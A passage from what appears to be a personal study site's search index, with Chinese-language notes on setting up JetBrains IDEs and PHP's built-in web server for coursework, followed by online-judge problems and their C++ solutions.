Toolbox\u7684\u8bdd\uff0c\u90a3\u4e48\u4f60\u7684\u4e0b\u8f7d\u5b89\u88c5\u5c06\u4f1a\u53d8\u5f97\u7279\u522b\u7b80\u5355\uff0c\u4ec5\u9700\u4e00\u952e\u5373\u53ef\u5b8c\u6210\uff08\u597d\u50cf\u4e5f\u662f\u5e9f\u8bdd\uff09\u3002","title":"IntelliJ IDEA Ultimate / PhpStorm"},{"location":"szu_courses/web/tools/#_1","text":"\u521d\u6b21\u542f\u52a8\u5373\u53ef\u9009\u62e9\u4e3b\u9898\uff0c\u5373\u4f7f\u4f60\u9519\u8fc7\u4e86\u5b83\uff0c\u4ecd\u7136\u53ef\u4ee5\u5728Settings->Appearance\u4e2d\u627e\u5230\u3002\u81f3\u4e8e\u4ee3\u7801\u7684\u989c\u8272\uff0c\u4f60\u53ef\u4ee5\u5728Settings->Editor->Color Scheme\u4e2d\u9009\u62e9\u4e00\u79cd\u4f60\u559c\u6b22\u7684\u3002\u66f4\u591a\u9009\u9879\u4f60\u53ef\u4ee5\u67e5\u9605\u5b98\u65b9\u6587\u6863\u3002\u53e6\u5916\uff0c\u6211\u6b63\u5728\u4f7f\u7528\u63d2\u4ef6Material Theme UI\uff0c\u5982\u679c\u4f60\u611f\u5174\u8da3\u7684\u8bdd\u4e0d\u59a8\u5b89\u88c5\u5c1d\u8bd5\u3002","title":"\u5916\u89c2\u548c\u7f16\u8f91\u5668"},{"location":"szu_courses/web/tools/#liveedit","text":"\u5f53\u4f60\u521a\u5f00\u59cb\u5199\u7f51\u9875\u65f6\uff0c\u4f60\u53ef\u80fd\u538c\u5026\u4e86\u4e0d\u505c\u5730\u4fdd\u5b58\u5e76\u5207\u6362\u5230\u6d4f\u89c8\u5668\u5237\u65b0\u6765\u67e5\u770b\u5b9e\u9645\u7684\u6548\u679c\u3002\u4f60\u53ef\u4ee5\u5b89\u88c5LiveEdit\u63d2\u4ef6\u6765\u5e2e\u52a9\u4f60\uff0c\u5b83\u5c06\u4f1a\u81ea\u52a8\u5237\u65b0\u4f60\u7684\u7f51\u9875\u800c\u4e0d\u9700\u8981\u4f60\u624b\u52a8\u64cd\u4f5c\u3002\u5b89\u88c5\u7684\u65f6\u5019\u8bf7\u6ce8\u610f\u8fd8\u9700\u8981\u5728Chrome\u6d4f\u89c8\u5668\u4e0a\u5b89\u88c5JetBrains IDE Support\u63d2\u4ef6\u3002","title":"LiveEdit\u63d2\u4ef6"},{"location":"szu_courses/web/tools/#_2","text":"\u6211\u5df2\u7ecf\u5b89\u88c5\u597d\u63d2\u4ef6\u4e86\uff0c\u5982\u4f55\u542f\u52a8\uff1f \u5f53\u4f60\u8fd8\u6ca1\u6709Run/Debug Configurations\u7684\u65f6\u5019\uff0c\u4e00\u4e2a\u6bd4\u8f83\u7b80\u5355\u7684\u65b9\u6cd5\u662f\u53f3\u51fb\u6807\u7b7e\uff0c\u7136\u540e\u9009\u62e9Debug\uff0c\u8fd9\u5c06\u81ea\u52a8\u751f\u6210Configuration\uff0c\u5e76\u5f00\u542f\u4e00\u4e2a\u6d4f\u89c8\u5668\u7a97\u53e3\u663e\u793a\u4f60\u7684\u7f51\u9875\u3002 \u9009\u62e9Debug\u540e\u751f\u6210\u4e86\u4e00\u4e2a\u7a7a\u767d\u7684\u6d4f\u89c8\u5668\u9875\u9762\uff1f \u8bf7\u786e\u8ba4Chrome\u6d4f\u89c8\u5668\u4e0a\u7684JetBrains IDE Support\u63d2\u4ef6\u662f\u5426\u5df2\u7ecf\u70b9\u4eae\uff0c\u5982\u679c\u6ca1\u6709\uff0c\u8bf7\u91cd\u542fIDE\u548c\u6d4f\u89c8\u5668\uff1b\u5982\u679c\u5df2\u7ecf\u70b9\u4eae\uff0c\u8bf7\u5c06\u9f20\u6807\u79fb\u81f3\u63d2\u4ef6\u56fe\u6807\u4e0a\u68c0\u67e5\u5176\u8fde\u63a5\u76ee\u6807\u662f\u5426\u4e3a\u5f53\u524d\u4f7f\u7528\u7684IDE\u3002\u6b64\u5916\uff0c\u76ee\u524d\u6709\u63a5\u5230\u6848\u4f8b\uff0cIDE\u66f4\u65b0\u81f3\u6700\u65b0\u7248\uff0c\u4f46LiveEdit\u63d2\u4ef6\u5e76\u672a\u66f4\u65b0\u800c\u65e0\u6cd5\u8c03\u8bd5\uff0c\u66f4\u65b0\u63d2\u4ef6\u540e\u5373\u6062\u590d\u6b63\u5e38\u3002\u5982\u8fd8\u6709\u5176\u5b83\u95ee\u9898\uff0c\u53ef\u5728\u4e0b\u65b9\u8bc4\u8bba\u6216\u81ea\u884c\u641c\u7d22\u6216\u524d\u5f80\u793e\u533a\u5bfb\u6c42\u5e2e\u52a9\u3002","title":"\u5e38\u89c1\u95ee\u9898"},{"location":"szu_courses/web/tools/#_3","text":"\u4f60\u53ef\u4ee5\u5728\u5b98\u65b9\u6587\u6863\u4e2d\u627e\u5230\uff0c\u4e5f\u53ef\u901a\u8fc7 Tip of the Day \u96f6\u6563\u5730\u5b66\u4e60\u3002\u521a\u5728CLion\u90a3\u7bc7\u91cc\u5199\u8fc7\u4e86\u4e00\u4e9b\u5feb\u6377\u952e\uff0c\u800c\u4e14\u5927\u90e8\u5206\u5e94\u8be5\u662f\u4e00\u6837\u7684\uff0c\u5b9e\u5728\u4e0d\u60f3\u518d\u91cd\u590d\u4e00\u904d\u4e86\uff0c\u6765\u8ba8\u8bba\u51e0\u4e2a\u5e38\u7528\u7684\u5c31\u597d\u3002 Ctrl+D \u76f4\u63a5\u590d\u5236\u4e00\u884c Clone Caret Above/Below \u4f60\u4e0d\u80fd\u6709\u5f88\u591a\u53ea\u624b\u6765\u5e2e\u4f60\u66f4\u5feb\u5730\u7f16\u8f91\u4ee3\u7801\uff0c\u4f46\u662f\u62e5\u6709\u591a\u4e2a\u5149\u6807\u540c\u65f6\u7f16\u8f91\u5374\u5f88\u5bb9\u6613\u3002\u8fd9\u4e2a\u5feb\u6377\u952e\u5728\u6211\u5f53\u524d\u7684\u73af\u5883\u4e0b\u4f3c\u4e4e\u5e76\u4e0d\u662f\u90a3\u4e48\u5bb9\u6613\u63cf\u8ff0\uff08Keymap: Default for KDE, IDEA 2018.3.4\uff09\uff0c\u4f60\u53ef\u4ee5 Double Ctrl \uff0c\u8bf7\u6ce8\u610f\uff0c\u7b2c\u4e8c\u6b21\u6309\u4e0bCtrl\u65f6\u8bf7\u4e0d\u8981\u653e\u5f00\uff0c\u5426\u5219\u5c06\u542f\u52a8Run Anything\uff0c\u540c\u65f6\u4f60\u9700\u8981\u6309\u4e0a/\u4e0b\u65b9\u5411\u952e\u6765\u4ea7\u751f\u591a\u4e2a\u5149\u6807\u3002\u5370\u8c61\u4e2d\uff0c\u67d0\u4e9b\u7248\u672c\u7684PhpStorm\u53ef\u4ee5\u6309\u4f4f Alt \u7136\u540e\u4f7f\u7528\u65b9\u5411\u952e\u6765\u4ea7\u751f\u591a\u4e2a\u5149\u6807\uff0c\u6216\u8005\u5728\u6309\u4f4f Alt \u7684\u65f6\u5019\u5728\u5e0c\u671b\u4ea7\u751f\u5149\u6807\u7684\u4f4d\u7f6e\u70b9\u6309\u9f20\u6807\u3002\u4e0d\u8fc7\u4e8b\u5b9e\u4e0a\u4f60\u4e5f\u53ef\u4ee5\u81ea\u7531\u5730\u6539\u53d8\u8fd9\u4e00\u5207\uff0c\u53ef\u4ee5\u5728Settings->Keymap\u4e2d\u627e\u5230\u5b83\uff0c\u7136\u540e\u8bbe\u7f6e\u4e00\u4e2a\u987a\u624b\u7684\u4e0d\u51b2\u7a81\u7684\u5feb\u6377\u952e\u3002 Shift+F6 \u91cd\u547d\u540d Ctrl+Shift+T \u4f7f\u4ee3\u7801\u5757\u88ab\u56f4\u7ed5 \u6211\u89c9\u5f97\u8fd9\u771f\u7684\u662f\u6211\u6700\u540e\u4e00\u6b21\u5e9f\u8bdd\u8fd9\u4e9b\u4e1c\u897f\u4e86...","title":"\u4e00\u4e9b\u5feb\u6377\u952e"},{"location":"szu_courses/web/tools/#_4","text":"\u56fe\u5f62\u5316\u7684\u7248\u672c\u63a7\u5236\uff0c\u8981\u4e0d\u8981\uff1f \u5728\u5f00\u53d1\u4e00\u4e2a\u9879\u76ee\u7684\u65f6\u5019\uff0c\u901a\u5e38\u4f1a\u9700\u8981\u5229\u7528\u7248\u672c\u63a7\u5236\u7cfb\u7edf\u6765\u7ba1\u7406\u8bf8\u591a\u7248\u672c\uff0c\u5177\u4f53\u7528\u9014\u548c\u4f18\u70b9\u6211\u5c31\u4e0d\u5728\u8fd9\u91cc\u778e\u626f\u4e86\uff0c\u6211\u5efa\u8bae\u4f60\u53bbGoogle\u4e00\u4e0bGit\u4e4b\u7c7b\u7684...\u6211\u4e0d\u5728\u8fd9\u91cc\u5e9f\u8bdd\u5e76\u4e0d\u4ee3\u8868\u7740\u4e0d\u91cd\u8981\u554a\uff0c\u8fd9\u4e2a\u8fd8\u662f\u6bd4\u8f83\u91cd\u8981\u7684\u3002 \u6211\u8fd9\u91cc\u5c31\u5047\u8bbe\u4f60\u57fa\u672c\u4e0a\u5df2\u7ecf\u77e5\u9053\u4e86Git\u6216\u8005\u5176\u4ed6\u7248\u672c\u63a7\u5236\u7cfb\u7edf\u7684\u6700\u57fa\u7840\u7684\u4f7f\u7528\u65b9\u6cd5\u3002 \u65b0\u5efa\u4e00\u4e2a\u9879\u76ee\u65f6\uff0c\u4f60\u53ef\u4ee5\u9009\u62e9\u5728\u4e91\u7aef\uff08\u4f8b\u5982GitHub\u3001BitBucket\u3001Azure DevOps\u7b49\u6258\u7ba1\u7f51\u7ad9\uff09\u65b0\u5efa\u4e00\u4e2arepository\uff0c\u7136\u540e\u5728\u672c\u5730 clone \u5e76\u6253\u5f00\u5b83\uff0c\u8fd9\u53ef\u4ee5\u901a\u8fc7File->New->Project from Version Control...\u6765\u5b9e\u73b0\u3002\u5f53\u7136\uff0c\u5982\u679c\u4f60\u60f3\u57fa\u4e8e\u672c\u5730\u5df2\u7ecf\u5b58\u5728\u7684\u9879\u76ee\uff0c\u4f60\u53ef\u4ee5\u5728VCS->Git->Remotes...\u4e2d\u5c06\u4e91\u7aefrepo\u7684\u5730\u5740\u586b\u5165\u3002 \u5f53\u4f60\u5b8c\u6210\u4e86\u4e00\u4e9b\u4fee\u6539\u7684\u65f6\u5019\uff0c\u4f60\u53ef\u4ee5\u901a\u8fc7\u53f3\u4e0a\u89d2\u7684Commit\u6216\u662f\u5feb\u6377\u952e Ctrl+K \u6765 commit \u63d0\u4ea4\uff0c\u7136\u540e\u5728\u5f39\u51fa\u7684\u7a97\u53e3\u4e2d\u70b9\u51fb\u53f3\u4e0b\u65b9\u7684Commit and Push...\u5373\u53ef\u51c6\u5907\u5c06\u4fee\u6539 push \u63a8\u9001\u5230\u4e91\u7aef\u3002 \u5176\u5b83\u7684\u6211\u5c31\u4e0d\u591a\u5e9f\u8bdd\u4e86\uff0c\u5404\u4f4d\u81ea\u884c\u53d1\u6398\u5427\u3002","title":"\u7248\u672c\u63a7\u5236"},{"location":"szu_courses/web/tools/#_5","text":"\u4f60\u53ef\u80fd\u5df2\u7ecf\u6ce8\u610f\u5230\u4e86IDE\u91cc\u7684 Database \uff0c\u6ca1\u9519\uff0c\u5b83\u53ef\u4ee5\u7ba1\u7406\u6570\u636e\u5e93\u3002\u70b9\u51fb\u52a0\u53f7\u6765\u6dfb\u52a0\u4e00\u4e2aData Source\uff0c\u9009\u62e9\u4f60\u6240\u4f7f\u7528\u7684\u5bf9\u5e94\u7684\u6570\u636e\u5e93\u670d\u52a1\u5668\uff0c\u7136\u540e\u586b\u5165\u76f8\u5173\u4fe1\u606f\u5c31\u53ef\u4ee5\u6d4b\u8bd5\u8fde\u63a5\u4e86\u3002 \u4e00\u65e6\u6210\u529f\u8fde\u63a5\uff0c\u4f60\u5c31\u53ef\u4ee5\u901a\u8fc7\u5b83\u53ef\u89c6\u5316\u5730\u64cd\u4f5c\u6570\u636e\u5e93\u4e86\uff0c\u5e76\u4e14\u5b83\u53ef\u4ee5\u5e2e\u52a9\u4f60\u5199SQL\u8bed\u53e5\uff0c\u66f4\u597d\u7684\u5730\u65b9\u5728\u4e8e\u5b83\u8fd8\u53ef\u4ee5\u5728\u4f60\u5199\u540e\u53f0\u7a0b\u5e8f\u7684\u65f6\u5019\u63d0\u793a\u4f60\u6570\u636e\u5e93\u76f8\u5173\u7684\u4fe1\u606f\u3002","title":"\u6570\u636e\u5e93"},{"location":"szu_courses/web/tools/#_6","text":"\u4f60\u5e94\u8be5\u5f88\u5feb\u4f1a\u53d1\u73b0\u8fd9\u79cd\u76f4\u63a5\u5728\u6d4f\u89c8\u5668\u6253\u5f00\u4f60\u7684\u7f51\u9875\u7684\u65b9\u5f0f\u4e0d\u80fd\u6ee1\u8db3\u4f60\u4e86\uff0c\u4f60\u4f1a\u5e0c\u671b\u6709\u540e\u7aef\u6765\u5904\u7406\u5404\u79cd\u4e8b\u52a1\uff0c\u6709\u6570\u636e\u5e93\u6765\u4fdd\u5b58\u5404\u7c7b\u6570\u636e...\u5173\u4e8e\u670d\u52a1\u5668\u7684\u65b9\u6848\uff0c\u4f60\u53ef\u80fd\u542c\u8bf4\u4e86\u5f88\u591a\uff0c\u6bd4\u5982\u8001\u5e08\u53ef\u80fd\u4f1a\u63a8\u8350\u4f60\u4f7f\u7528XAMPP\uff0c\u53c8\u5982\u4f60\u53ef\u80fd\u542c\u8bf4\u8fc7WAMP\uff0c\u4f46\u63a5\u4e0b\u6765\u6211\u4f1a\u4ecb\u7ecd\u4e00\u4e9b\u5b8c\u5168\u4e0d\u540c\u7684\u65b9\u6848\u3002 Danger \u4e0d\u7ba1\u4f60\u4f7f\u7528\u4f55\u79cd\u65b9\u5f0f\uff0c\u5305\u62ec\u4f46\u4e0d\u9650\u4e8e\u5b89\u88c5\u5e76\u542f\u52a8\u4e0a\u9762\u7684\u670d\u52a1\u5168\u5bb6\u6876\uff08XAMPP\uff09\u3001\u8fd8\u662f\u6309\u7167\u4e0b\u9762\u7684\u8fc7\u7a0b\u9010\u4e00\u5b89\u88c5\u670d\u52a1\uff0c\u90fd\u662f\u628a\u4f60\u7684\u7535\u8111\u5f53\u6210\u670d\u52a1\u5668\u6765\u4f7f\u7528\u3002 \u5728\u5f00\u53d1\u8fc7\u7a0b\u4e2d\u5982\u679c\u4f60\u7684\u7535\u8111\u5904\u4e8e\u6821\u56ed\u7f51\u4e2d\u5e76\u4e14\u6ca1\u6709\u4e00\u5c42\u8def\u7531\u5668NAT\u4fdd\u62a4\uff0c\u5e76\u4e14\u4e5f\u6ca1\u6709\u5408\u7406\u5730\u914d\u7f6e\u9632\u706b\u5899\uff0c\u4f60\u6240\u5f00\u653e\u7684\u670d\u52a1\u53ef\u80fd\u88ab\u4ed6\u4eba\u8bbf\u95ee\u3002\u5982\u679c\u914d\u7f6e\u4e0d\u5f53\u6216\u662f\u7a0b\u5e8f\u5b58\u5728\u6f0f\u6d1e\uff0c\u8fd9\u5c06\u4f1a\u5e26\u6765\u4e25\u91cd\u7684\u95ee\u9898\uff0c\u4f8b\u5982\u4fe1\u606f\u6cc4\u6f0f\u6216\u751a\u81f3\u662f\u4e3b\u673a\u88ab\u63a7\u5236\u3002","title":"\u5173\u4e8e\u670d\u52a1"},{"location":"szu_courses/web/tools/#docker","text":"\u5f3a\u70c8\u63a8\u8350\u4f7f\u7528\u8fd9\u79cd\u65b9\u5f0f\uff0c\u7279\u522b\u662f\u90e8\u7f72\u4f60\u7684\u5e94\u7528\u7684\u65f6\u5019\u3002\u6211\u4f1a\u7279\u522b\u5730\u5728\u53e6\u4e00\u7bc7\u6587\u7ae0\u4e2d\u63cf\u8ff0\u8fd9\u79cd\u65b9\u6cd5\u3002","title":"Docker"},{"location":"szu_courses/web/tools/#php-built-in-web-server","text":"As of PHP 5.4.0, the CLI SAPI provides a built-in web server. -- Built-in Web Server, php.net \u6709\u5173\u5185\u7f6eWeb Server\u7684\u66f4\u591a\u4fe1\u606f\uff0c\u8bf7\u8bbf\u95ee \u8fd9\u91cc \u3002 \u4e2a\u4eba\u8ba4\u4e3a\u8fd9\u662f\u4e00\u4e2a\u76f8\u5bf9\u7b80\u5355\u5f97\u591a\u7684\u65b9\u6848\uff0c\u7279\u522b\u662f\u4f60\u53ef\u4ee5\u76f4\u63a5\u901a\u8fc7IDE\u6765\u542f\u52a8\u670d\u52a1\u5668\u3002 Warning \u5b98\u65b9\u6587\u6863\u5df2\u7ecf\u6307\u51fa\uff0c\u5b83\u53ea\u5e94\u8be5\u7528\u4e8e\u5f00\u53d1\uff0c\u800c\u4e0d\u5e94\u5728\u5b9e\u9645\u751f\u4ea7\u73af\u5883\u4e2d\u4f7f\u7528\u3002 \u9996\u5148\u4f60\u5e94\u5148\u6709\u4e00\u4e2aPHP\u89e3\u91ca\u5668\uff0c\u5982\u679c\u8fd8\u6ca1\u6709\u5b89\u88c5\uff0c\u8bf7\u524d\u5f80 \u5b98\u7f51 \u4e0b\u8f7d\u3002\u8fd9\u91cc\u5c31\u5047\u8bbe\u4f60\u5df2\u7ecf\u90e8\u7f72\u597d\u4e86\u4f60\u7684PHP\u89e3\u91ca\u5668\uff0c\u4f60\u53ea\u9700\u8981\u5728Run/Debug Configurations\u91cc\u6dfb\u52a0\u4e00\u4e2a PHP Built-in Web Server \uff0c\u8bf7\u6ce8\u610f\u6307\u5b9a\u6839\u76ee\u5f55\u548c\u89e3\u91ca\u5668\uff0c \u8bf7\u6839\u636e\u5b9e\u9645\u60c5\u51b5\u8bbe\u5b9a\u6839\u76ee\u5f55\uff1a \u540c\u7406\uff0c\u5982\u679c\u4e0b\u65b9\u51fa\u73b0\u8b66\u544a\u6307\u51fa\u672a\u6307\u5b9aPHP\u89e3\u91ca\u5668\uff0c\u4f60\u53ef\u4ee5\u70b9\u51fbFIX\u540e\u5728\u65b0\u7a97\u53e3\u4e2d\u8bbe\u7f6e\u597d\u3002\u53e6\u5916\uff0c\u4e5f\u8bf7\u7559\u610f\u4e00\u4e0b\u76d1\u542c\u5730\u5740\u3002 \u4fdd\u5b58\u540e\u70b9\u51fbRun\u5373\u53ef\u542f\u52a8Web\u670d\u52a1\u5668\uff0c\u5728\u6d4f\u89c8\u5668\u4e2d\u8bbf\u95ee\u521a\u624d\u8bb0\u4f4f\u7684\u5730\u5740\u5373\u53ef\u3002 \u4f60\u5e94\u8be5\u53ef\u4ee5\u770b\u5230\u4f60\u5199\u597d\u7684index\uff0c\u5982\u679c\u4e0d\u662findex\uff0c\u8bf7\u8bb0\u5f97\u5728\u5730\u5740\u680f\u8f93\u5165\u4f60\u6240\u5e0c\u671b\u8bf7\u6c42\u7684\u6587\u4ef6\u540d\u3002 Tip \u8fd9\u4e2a\u65f6\u5019\u7684\u670d\u52a1\u5668\u662f\u53ea\u76d1\u542c\u672c\u673a\u8bf7\u6c42\u7684\uff0c\u4e5f\u5c31\u662f\u8bf4\u4e0d\u4f1a\u53d7\u5230\u6765\u81ea\u5176\u4ed6\u4e3b\u673a\u7684\u653b\u51fb\u3002\u4e0d\u8fc7\uff0c\u5176\u4ed6\u4eba\u4e5f\u5c31\u65e0\u6cd5\u5728\u4ed6\u4eec\u7684\u7535\u8111\u4e0a\u76f4\u63a5\u8bbf\u95ee\u5e76\u67e5\u770b\u4f60\u7684\u6210\u679c\u4e86\u3002 \u5982\u679c\u4f60\u95ee\u6211\u6570\u636e\u5e93\u7684\u8bdd...\u5176\u5b9e\u8fd9\u4e2a\u4e0d\u662f\u7279\u522b\u91cd\u8981\uff0c\u4f60\u53ef\u4ee5\u9009\u62e9MySQL\u3001MariaDB\u3001PostgreSQL\u7b49\u7b49\u4f17\u591a\u6570\u636e\u5e93\u7684Windows\u7248\u672c\uff0c\u6216\u8005\u5728\u5b50\u7cfb\u7edf\u4e0a\u5b89\u88c5\u3002\u968f\u540e\u4f60\u53ea\u8981\u542f\u52a8\u4e86\u670d\u52a1\u5668\uff0c\u4f60\u5c31\u53ef\u4ee5\u901a\u8fc7\u5ba2\u6237\u7aef\u6216\u662fPHP\u6765\u8bbf\u95ee\u4e86\u3002 \u8fd9\u91cc\u672c\u6765\u662f\u6253\u7b97\u5199\u5728\u5b50\u7cfb\u7edf\u4e0a\u5b89\u88c5\u670d\u52a1\u7684\uff0c\u4f46\u662f\u8003\u8651\u5230\u5b89\u5168\u6027\u4e4b\u7c7b\u7684\u8fd8\u662f\u5220\u6389\u4e86\u3002\u8fd8\u662f\u5efa\u8bae\u641e\u4e2a\u4e91\u4e3b\u673a\u6765\u8dd1Docker\uff0c\u4e0b\u4e00\u7bc7\u6162\u6162\u8bb2\u3002","title":"PHP Built-in Web Server"},{"location":"szu_oj/cpp/1084/","text":"\u6c42\u77e9\u9635\u7684\u6700\u5927\u548c\u6700\u5c0f\u503c \u65f6\u95f4\u9650\u5236: 1 Sec \u5185\u5b58\u9650\u5236: 128 MB \u9898\u76ee\u63cf\u8ff0 \u5b9a\u4e49\u4e00\u4e2a\u51fd\u6570\u7528\u4e00\u7ea7\u6307\u9488\u63a5\u6536\u4e00\u4e2a\u4efb\u610f\u884c\u4efb\u610f\u5217\u7684\u77e9\u9635\u5e76\u8fd4\u56de\u8be5\u77e9\u9635\u5143\u7d20\u7684\u6700\u5927\u548c\u6700\u5c0f\u503c. \u8f93\u5165 \u77e9\u9635\u7684\u884c\u6570 \u77e9\u9635\u7684\u5217\u6570 \u77e9\u9635\u5404\u5143\u7d20\u7684\u503c \u8f93\u51fa \u6700\u5927\u503c \u6700\u5c0f\u503c \u6837\u4f8b\u8f93\u5165 1 2 3 4 3 3 1 2 3 4 5 6 7 8 9 \u6837\u4f8b\u8f93\u51fa 1 2 9 1 \u63d0\u793a \u89e3\u51b3\u65b9\u6848 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 #include <iostream> void findMinAndMaxValues ( int * ptr , int row , int col ); int main () { int row , col ; std :: cin >> row >> col ; int mat [ row ][ col ]; for ( int ir = 0 ; ir < row ; ++ ir ) { for ( int ic = 0 ; ic < col ; ++ ic ) { std :: cin >> mat [ ir ][ ic ]; } } findMinAndMaxValues ( & mat [ 0 ][ 0 ], row , col ); return 0 ; } void findMinAndMaxValues ( int * ptr , int row , int col ) { int min = * ptr , max = * ptr ; for ( int ir = 0 ; ir < row ; ++ ir ) { for ( int ic = 0 ; ic < col ; ++ ic ) { if ( ptr [ ir * col + ic ] < min ) { min = ptr [ ir * col + ic ]; } if ( ptr [ ir * col + ic ] > max ) { max = ptr [ ir * col + ic ]; } } } std :: cout << max << std :: endl << min << std :: endl ; }","title":"\u6c42\u77e9\u9635\u7684\u6700\u5927\u548c\u6700\u5c0f\u503c"},{"location":"szu_oj/cpp/1084/#_1","text":"\u65f6\u95f4\u9650\u5236: 1 Sec \u5185\u5b58\u9650\u5236: 128 MB","title":"\u6c42\u77e9\u9635\u7684\u6700\u5927\u548c\u6700\u5c0f\u503c"},{"location":"szu_oj/cpp/1084/#_2","text":"\u5b9a\u4e49\u4e00\u4e2a\u51fd\u6570\u7528\u4e00\u7ea7\u6307\u9488\u63a5\u6536\u4e00\u4e2a\u4efb\u610f\u884c\u4efb\u610f\u5217\u7684\u77e9\u9635\u5e76\u8fd4\u56de\u8be5\u77e9\u9635\u5143\u7d20\u7684\u6700\u5927\u548c\u6700\u5c0f\u503c.","title":"\u9898\u76ee\u63cf\u8ff0"},{"location":"szu_oj/cpp/1084/#_3","text":"\u77e9\u9635\u7684\u884c\u6570 \u77e9\u9635\u7684\u5217\u6570 \u77e9\u9635\u5404\u5143\u7d20\u7684\u503c","title":"\u8f93\u5165"},{"location":"szu_oj/cpp/1084/#_4","text":"\u6700\u5927\u503c \u6700\u5c0f\u503c","title":"\u8f93\u51fa"},{"location":"szu_oj/cpp/1084/#_5","text":"1 2 3 4 3 3 1 2 3 4 5 6 7 8 9","title":"\u6837\u4f8b\u8f93\u5165"},{"location":"szu_oj/cpp/1084/#_6","text":"1 2 9 1","title":"\u6837\u4f8b\u8f93\u51fa"},{"location":"szu_oj/cpp/1084/#_7","text":"","title":"\u63d0\u793a"},{"location":"szu_oj/cpp/1084/#_8","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 #include <iostream> void findMinAndMaxValues ( int * ptr , int row , int col ); int main () { int row , col ; std :: cin >> row >> col ; int mat [ row ][ col ]; for ( int ir = 0 ; ir < row ; ++ ir ) { for ( int ic = 0 ; ic < col ; ++ ic ) { std :: cin >> mat [ ir ][ ic ]; } } findMinAndMaxValues ( & mat [ 0 ][ 0 ], row , col ); return 0 ; } void findMinAndMaxValues ( int * ptr , int row , int col ) { int min = * ptr , max = * ptr ; for ( int ir = 0 ; ir < row ; ++ ir ) { for ( int ic = 0 ; ic < col ; ++ ic ) { if ( ptr [ ir * col + ic ] < min ) { min = ptr [ ir * col + ic ]; } if ( ptr [ ir * col + ic ] > max ) { max = ptr [ ir * col + ic ]; } } } std :: cout << max << std :: endl << min << std :: endl ; }","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"szu_oj/cpp/1295/","text":"\u5355\u8bcd\u7edf\u8ba1 \u65f6\u95f4\u9650\u5236: 1 Sec \u5185\u5b58\u9650\u5236: 128 MB \u9898\u76ee\u63cf\u8ff0 \u7f16\u5199\u4e00\u4e2a\u7a0b\u5e8f\uff0c\u6839\u636e\u5355\u8bcd\u7684\u51fa\u73b0\u9891\u7387\u964d\u5e8f\u6253\u5370\u51fa\u6240\u8f93\u5165\u7684\u7684\u5404\u4e2a\u5355\u8bcd\u3002\u6bcf\u4e2a\u5355\u8bcd\u524d\u6807\u6709\u5b83\u7684\u8ba1\u6570\u503c\u3002 \u8f93\u5165 \u5404\u4e2a\u5355\u8bcd\uff0c\u8f93\u51650\u5219\u8868\u793a\u5355\u8bcd\u7ed3\u675f \u8f93\u51fa \u964d\u5e8f\u6253\u5370\u5355\u8bcd\u51fa\u73b0\u7684\u9891\u7387\u548c\u5355\u8bcd\u3002\u5355\u8bcd\u9891\u5ea6\u76f8\u540c\uff0c\u6309\u51fa\u73b0\u987a\u5e8f\u8f93\u51fa\u3002 \u6837\u4f8b\u8f93\u5165 1 2 3 4 5 6 7 8 bad good bad cute how good good 0 \u6837\u4f8b\u8f93\u51fa 1 2 3 4 3 good 2 bad 1 cute 1 how \u63d0\u793a \u89e3\u51b3\u65b9\u6848 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 #include <iostream> #include <string> #include <vector> #include <algorithm> struct Pair { std :: string string ; int count ; Pair ( std :: string & string , int count ) : string ( string ), count ( count ) {} }; bool operator == ( Pair & pair , const std :: string & string ) { return pair . string == string ; } bool operator < ( const Pair & lhs , const Pair & rhs ) { return lhs . count > rhs . count ; // NG } int main () { std :: vector < Pair > vector ; std :: string string ; std :: cin >> string ; while ( string != \"0\" ) { std :: vector < Pair >:: iterator it = std :: find ( vector . begin (), vector . end (), string ); if ( it != vector . end ()) { it -> count += 1 ; } else { vector . push_back ( Pair ( string , 1 )); } std :: cin >> string ; } std :: sort ( vector . begin (), vector . end ()); for ( int i = 0 ; i < vector . size (); ++ i ) { std :: cout << vector [ i ]. count << ' ' << vector [ i ]. string << std :: endl ; } return 0 ; }","title":"\u5355\u8bcd\u7edf\u8ba1"},{"location":"szu_oj/cpp/1295/#_1","text":"\u65f6\u95f4\u9650\u5236: 1 Sec \u5185\u5b58\u9650\u5236: 128 MB","title":"\u5355\u8bcd\u7edf\u8ba1"},{"location":"szu_oj/cpp/1295/#_2","text":"\u7f16\u5199\u4e00\u4e2a\u7a0b\u5e8f\uff0c\u6839\u636e\u5355\u8bcd\u7684\u51fa\u73b0\u9891\u7387\u964d\u5e8f\u6253\u5370\u51fa\u6240\u8f93\u5165\u7684\u7684\u5404\u4e2a\u5355\u8bcd\u3002\u6bcf\u4e2a\u5355\u8bcd\u524d\u6807\u6709\u5b83\u7684\u8ba1\u6570\u503c\u3002","title":"\u9898\u76ee\u63cf\u8ff0"},{"location":"szu_oj/cpp/1295/#_3","text":"\u5404\u4e2a\u5355\u8bcd\uff0c\u8f93\u51650\u5219\u8868\u793a\u5355\u8bcd\u7ed3\u675f","title":"\u8f93\u5165"},{"location":"szu_oj/cpp/1295/#_4","text":"\u964d\u5e8f\u6253\u5370\u5355\u8bcd\u51fa\u73b0\u7684\u9891\u7387\u548c\u5355\u8bcd\u3002\u5355\u8bcd\u9891\u5ea6\u76f8\u540c\uff0c\u6309\u51fa\u73b0\u987a\u5e8f\u8f93\u51fa\u3002","title":"\u8f93\u51fa"},{"location":"szu_oj/cpp/1295/#_5","text":"1 2 3 4 5 6 7 8 bad good bad cute how good good 0","title":"\u6837\u4f8b\u8f93\u5165"},{"location":"szu_oj/cpp/1295/#_6","text":"1 2 3 4 3 good 2 bad 1 cute 1 how","title":"\u6837\u4f8b\u8f93\u51fa"},{"location":"szu_oj/cpp/1295/#_7","text":"","title":"\u63d0\u793a"},{"location":"szu_oj/cpp/1295/#_8","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 #include <iostream> #include <string> #include <vector> #include <algorithm> struct Pair { std :: string string ; int count ; Pair ( std :: string & string , int count ) : string ( string ), count ( count ) {} }; bool operator == ( Pair & pair , const std :: string & string ) { return pair . string == string ; } bool operator < ( const Pair & lhs , const Pair & rhs ) { return lhs . count > rhs . count ; // NG } int main () { std :: vector < Pair > vector ; std :: string string ; std :: cin >> string ; while ( string != \"0\" 